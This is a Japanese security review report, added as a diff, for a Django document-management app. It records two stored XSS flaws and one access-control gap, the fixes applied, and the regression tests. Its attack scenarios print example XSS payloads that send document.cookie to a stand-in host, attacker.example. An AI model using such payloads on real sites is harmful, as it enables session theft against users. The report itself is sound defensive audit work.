@@ -1,0 +1,196 @@
+セキュリティレビュー結果
+====================
+
+対象: プロジェクト全体（現在のブランチ・作業ツリーの状態、2026-08-26時点）
+方式: 2段階レビュー
+  1) サブタスクによる脆弱性候補の洗い出し（差分＋変更後ファイル全体を精査）
+  2) 別の独立サブタスクによる偽陽性フィルタリング（各候補を個別に再検証、信頼度スコア付け）
+  3) 上記に加え、コードベース内で既に確立されている安全なパターン
+     （`escapejs`/`json_script`フィルタの使用箇所）と比較する横断確認を追加実施し、
+     アプリ全体から高確度の脆弱性を洗い出した。
+
+コードの修正は行っていません（読み取り専用調査のみ）。
+
+
+【高】1件: 格納型XSS — popup-select描画でのHTMLエスケープ漏れ
+--------------------------------------------------------------
+- 該当箇所: static/js/common.js:292, 295（popup-selectの選択肢描画部分）
+- カテゴリ: stored_xss
+- 信頼度: 高（コードベース内の直接検証により確認。同一データフローを持つ他画面と比較して
+  エスケープ処理が一貫して欠落していることを確認済み）
+
+説明:
+  popup-select（部署／分類／カテゴリー選択ポップアップ）の選択肢描画で、APIから取得した
+  `item.label`をテンプレートリテラルで組み立てた文字列のまま`row.innerHTML`に代入している。
+
+    row.innerHTML = `<label><input type="checkbox" class="item-checkbox" value="${item.value}"
+      data-label="${item.label}" ${isChecked}> ${item.label}</label>`;
+
+  `item.label`の値は`core/api.py`の`BaseOptionListAPIView._group_items`/`_category_items`/
+  `_department_items`が返す`masters.Group.name`（分類名）・`masters.Category.name`
+  （カテゴリー名）・部署名であり、いずれも`models.CharField`のフリーテキストで、フォーム側
+  （masters/forms.py の GroupForm/CategoryForm）にもHTML特殊文字を制限するバリデーションは
+  存在しない。
+
+  さらに、簡易設計指示書Rev1.2の反映により、分類・カテゴリー管理は「部署」スコープが追加され、
+  管理者でない一般ユーザー（自部署の分類/カテゴリー担当者）も自部署内であれば分類名・
+  カテゴリー名を登録・編集できる（masters/views.py, masters/forms.py）。
+
+  一方、同じコードベース内で文書名・契約書名など他のユーザー入力をJS/HTMLコンテキストへ
+  埋め込む箇所（templates/documents/search.html, templates/contracts/search.html 等）では
+  一貫して`|escapejs`フィルタが使われており、popup-selectのこの箇所だけがエスケープを
+  欠いている。これは新機能追加（Rev1.2の部署スコープ分類/カテゴリー管理）によって、
+  従来は管理者のみが触れていたマスタ名にXSSペイロードを仕込める攻撃面が、部署単位の
+  一般ユーザーにまで広がった点が特に問題。
+
+攻撃シナリオ:
+  1. 自部署の分類/カテゴリー管理権限を持つ一般ユーザーが、分類名またはカテゴリー名に
+     `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`
+     のようなペイロードを設定して登録する。
+  2. 別のユーザー（管理者を含む、どのロールでも）が文書/契約書の検索・登録・編集画面で
+     分類またはカテゴリーのpopup-selectを開くと、`innerHTML`経由でペイロードがそのまま
+     DOMに挿入され、閲覧者のブラウザ上でスクリプトが実行される。
+  3. セッションクッキーの窃取、CSRFトークンの取得、閲覧者の権限での不正操作（文書削除・
+     権限変更等の代理実行）につながり得る。
+
+推奨対応:
+  - `row.innerHTML`への組み込みをやめ、`textContent`によるテキスト設定、または
+    `document.createElement`＋`el.textContent = item.label`のようなDOM API経由の組み立てに
+    変更する。
+  - どうしても`innerHTML`を使う場合は、値の部分のみを別途HTMLエスケープするユーティリティ関数
+    を通す（既存コードベースの`|escapejs`相当の考え方をJS側にも導入する）。
+
+
+【高】1件: 格納型XSS — `departments_json|safe`のscriptタグ埋め込み時のエスケープ漏れ
+--------------------------------------------------------------
+- 該当箇所:
+  templates/accounts/staff_edit.html:126
+  templates/accounts/staff_list.html:148
+  templates/accounts/staff_regist.html:106
+  templates/organizations/dept_list.html:96
+  （データ生成元: organizations/services.py:98-114 `departments_json()`）
+- カテゴリ: stored_xss
+- 信頼度: 高（`json.dumps()`の出力をそのまま`|safe`で`<script>`タグ内に埋め込んでおり、
+  `</script>`のエスケープが行われないことをコードから直接確認済み）
+
+説明:
+  `departments_json()`は`Department`（部署）の`branch_name`（本支所名）・`section_name`
+  （部課名）を含むリストを`json.dumps()`でシリアライズするだけの関数で、`</script>`等の
+  HTML特殊シーケンスに対する対策は行っていない。
+
+    return json.dumps([{ ..., "branch_name": d.branch_name, ..., "section_name": d.section_name, ...}
+                        for d in Department.objects.order_by(...)])
+
+  これが4つのテンプレートで以下のように`|safe`フィルタ経由でインラインscriptタグに
+  直接埋め込まれている。
+
+    const departments = {{ departments_json|safe }};
+
+  `branch_name`/`section_name`は`organizations/forms.py`の`DeptRegistForm`/`DeptEditForm`
+  （`settings_menu_key = "dept_management"`権限を持つユーザーが利用可能）でフリーテキスト
+  入力可能であり、文字種・HTML特殊文字を制限するバリデーションが無い。
+
+  同じプロジェクト内で、他の同種のJSON埋め込み（`documents/storage2.html`,
+  `documents/edit.html`の`expiry_previews`等）は`|json_script`フィルタを使用しており、これは
+  Django側で`</script>`等を安全にエスケープする。`departments_json`だけが例外的に生の
+  `|safe`を使っており、確立された安全なパターンからの逸脱になっている。
+
+攻撃シナリオ:
+  1. 部署管理（dept_management）権限を持つユーザーが、部課名に
+     `</script><script>fetch('https://attacker.example/steal?c='+document.cookie)</script>`
+     のような文字列を設定して部署を登録・編集する。
+  2. 別のユーザー（staff_master権限で職員マスタ一覧/登録/編集画面を開く別ユーザー、
+     または部署管理一覧を開く別ユーザー）がページを表示すると、`</script>`によって元の
+     scriptタグが閉じられ、後続の任意スクリプトがそのままブラウザ上で実行される。
+  3. dept_managementとstaff_masterは別個の権限であり得るため、部署名を操作できるユーザーと
+     被害を受けるユーザーの権限境界をまたいだ攻撃が成立し得る。
+
+推奨対応:
+  - `{{ departments_json|safe }}`を`{{ departments|json_script:"departments-data" }}`
+    （Djangoの`json_script`テンプレートタグ）に置き換え、JS側は
+    `JSON.parse(document.getElementById("departments-data").textContent)`で読み込む形に変更する。
+  - `departments_json()`自体をPythonのdict/listのまま返すように変更し、シリアライズと
+    エスケープをテンプレート側の`json_script`に一元化するとより安全。
+
+
+【低】1件: 権限管理オプションAPIのロール制御欠如（既知・対応見送り事項）
+--------------------------------------------------------------
+- 該当箇所: permissions/api.py:13 `OptionListAPIView`
+- カテゴリ: broken_access_control
+- 信頼度: 中（実際に悪用可能だが影響範囲は限定的。開発チーム自身が同ファイル内コメントで
+  既に認識・記録済み）
+
+説明:
+  `OptionListAPIView`は`LoginRequiredMixin`のみを継承しており、権限管理画面
+  （`SettingsMenuAccessMixin`相当のロール制御）へのアクセス権を持たない一般ユーザーでも、
+  ログインさえしていれば`/permissions/api/options/?type=dept`（全部署）や
+  `?type=group&doc_kbn=contract`（全分類）を直接呼び出して取得できる。
+
+  一方、同種の情報を返す`core/api.py`の`BaseOptionListAPIView`（documents/contracts検索・
+  保管画面用）は、非管理者に対して`visible_department_ids`／`contract_searchable_department_ids`
+  で自部署＋閲覧範囲にスコープしており、`organizations/api.py`も過去の監査
+  （2026-08-24）で同種の「全部署が無制限に取得できる」問題が発見・修正され、
+  `can_access_settings_menu_item`によるサーバー側チェックが追加された経緯がdocstringに
+  残っている。`permissions/api.py`だけがこの統一的な対策から外れている。
+
+  影響は部署名・分類/カテゴリー名という業務メタデータの開示にとどまり、PermissionProfile
+  自体の変更やPII・認証情報の漏洩は伴わない。同ファイル23-29行目付近には開発チーム自身に
+  よる「優先度: 低・見送り」の注記が既にある。
+
+攻撃シナリオ:
+  権限管理メニューへのアクセス権を持たない認証済みユーザーが、`/permissions/api/options/`
+  にtype/doc_kbnパラメータを変えて直接リクエストし、本来アクセスできないはずの全部署一覧・
+  全分類一覧（他部署分を含む）を取得する。
+
+推奨対応:
+  - `organizations/api.py`で採用済みの`can_access_settings_menu_item(user, "...")`による
+    サーバー側チェックと同様のロール制御を`OptionListAPIView.dispatch()`に追加し、他の
+    設定系APIとの一貫性を取る。
+  - 対応不要と判断する場合も、この判断根拠（他画面での露出状況の再確認結果）をコメントとして
+    更新しておくことを推奨する（現状のコメントの前提—「他画面でも同種ロールに露出済み」—は
+    `core/api.py`の実装と矛盾しているため）。
+
+
+対応状況（2026-08-26）
+--------------------------------------------------------------
+【高】1件: popup-select（common.js）のHTMLエスケープ漏れ
+  → 修正済み。row.innerHTMLへのテンプレートリテラル埋め込みをやめ、document.createElement
+    ＋input.dataset.label／document.createTextNodeによるDOM API組み立てに変更
+    （static/js/common.js）。ブラウザで`<img src=x onerror=...>`をitem.labelに与えて
+    renderPopupPopupItems()を実行し、エスケープされたテキストとして表示されxssFired=falseと
+    なることを確認済み。
+
+【高】1件: departments_json|safeのscriptタグ埋め込み時のエスケープ漏れ
+  → 修正済み。organizations/services.pyの`departments_json()`（json.dumps文字列を返す関数）を
+    `departments_list()`（Pythonのlistをそのまま返す関数）に変更し、4テンプレート
+    （templates/accounts/staff_edit.html, staff_list.html, staff_regist.html,
+    templates/organizations/dept_list.html）を`{{ departments_json|safe }}`から
+    `{{ departments_pulldown|json_script:"departments-data" }}`＋
+    `JSON.parse(document.getElementById('departments-data').textContent)`に変更
+    （organizations/views.py, accounts/views.pyのcontext変数名も追随）。
+    organizations/tests.pyに`</script><script>`を含むbranch_nameのレンダリング結果を検証する
+    回帰テスト（test_department_name_with_script_tag_is_escaped_in_pulldown_json）を追加し、
+    ブラウザでも同等のペイロードでxssFired=falseとなることを確認済み。
+  ※ dept_list.htmlのビューは元々"departments"キーで一覧表示用querysetを渡していたため、
+    連動プルダウン用データは別名"departments_pulldown"にしてキー衝突を回避した。
+
+【低】1件: permissions/api.py OptionListAPIViewのロール制御欠如
+  → 対応見送り（ユーザー指示により本レビューでは低優先度のため未修正。理由は下記原文の
+    「推奨対応」欄の通りで、影響が部署名・分類/カテゴリー名という業務メタデータの開示に
+    留まりPII・認証情報の漏洩を伴わないため）。対応する場合はorganizations/api.pyと同様の
+    `can_access_settings_menu_item`チェックをdispatch()に追加すること。
+
+検証: 上記2件の修正後、python manage.py testで全641件がOK（回帰なし）。
+
+
+補足: 除外した検討事項
+--------------------------------------------------------------
+以下はDoS・レート制限・秘密情報のディスク保存など、本レビューの対象外として明示的に
+除外した（ユーザー影響の実証がない、または既知の除外カテゴリに該当するため）:
+  - CSVエクスポート/インポート処理（`sanitize_csv_row`による数式インジェクション対策は
+    温存されており問題なし）
+  - `mark_safe`/`eval`/`subprocess`/生SQL（`.raw()`/`cursor.execute()`）の使用箇所
+    （`core/views.py`, `core/widgets.py`にヒットしたが、いずれもユーザー入力を直接
+    渡していないことを確認済み）
+  - 部署スコープ・IDOR対策（documents/contracts間の共通化、`scoped_get_object_or_404`）は
+    既にコミット済み（f2cd70e）で、本レビュー時点で新規の抜けは確認されなかった
